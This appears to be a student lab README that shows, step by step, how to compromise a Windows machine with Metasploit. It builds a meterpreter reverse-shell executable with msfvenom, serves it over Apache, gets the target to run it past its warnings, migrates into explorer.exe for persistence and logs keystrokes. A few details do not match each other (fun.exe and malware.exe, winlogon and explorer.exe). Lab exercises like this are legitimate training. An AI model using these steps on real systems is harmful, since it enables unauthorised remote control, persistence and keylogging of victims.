# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/5ef2d834-a459-41c8-853c-4d90f8e18a3c)

Create a malicious executable file fun.exe using msenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > malware.exe

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/e25f8878-cafd-4e2c-b17c-4cd73fb9cc1b)

copy the malware.exe into the apache /var/www/html folder

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/4fff02b1-eaa0-40f5-b869-e8ef8af62515)

Start apache server

sudo systemctl apache2 start

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/c9008388-1884-4c35-81a1-ce3b44063975)

Check the status of apache2

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/7b19b8c8-540d-46b9-981b-3631a176420b)

Invoke msfconsole:

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/7fd888bd-ad4b-4b1c-9425-8d0336d2291e)
![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/21ea98df-d39a-4a59-84b0-b67832beb5fe)

use multi/handler

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/9d8ad938-7991-49a1-8bdd-8f9216dda092)

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:

http://192.168.1.2/fun.exe

The file "fun.exe" downloads.

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/879eb0f3-d176-4fff-ae72-815ac36c114a)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/d2b45fcb-e94a-4c02-af80-6931f49922b3)

To see a list of processes, at the meterpreter > prompt, execute this command:

ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/56c98758-1c88-4dac-953c-b19d958957b1)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process.

At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:

netstat

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.

Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/6f12e8b4-6764-4d82-91d9-ff855ae9a2f6)

Post Exploitation

The target is now owned. Following are meterpreter commands for key capturing in the target machine

keyscan_start Begins capturing keys typed in the target.

On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/67306211-b1c6-48b5-9dee-6ab4cacb4aa4)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/R-Guruprasad/Compromising-windows-using-Metasploit/assets/119390308/c274affd-4e9b-45c9-8233-3a94e1262d59)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
